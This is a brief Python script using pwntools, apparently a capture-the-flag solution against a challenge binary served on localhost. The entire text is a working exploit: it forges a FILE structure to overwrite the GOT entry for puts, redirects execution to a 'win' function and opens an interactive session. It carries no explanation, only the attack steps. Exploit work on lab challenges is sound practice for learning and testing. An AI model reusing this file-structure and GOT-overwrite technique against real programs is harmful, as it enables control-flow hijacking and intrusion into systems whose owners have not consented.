from pwn import *
elf = context.binary = ELF("chal")
p = remote("127.0.0.1", 8000) #process()
cls = lambda: print(p.clean(timeout=0.2).decode())

cls()
fs = FileStructure()
pay = fs.read(elf.got["puts"], 10)
p.send(pay)
cls()
p.sendline(p64(elf.sym["win"]))
p.interactive()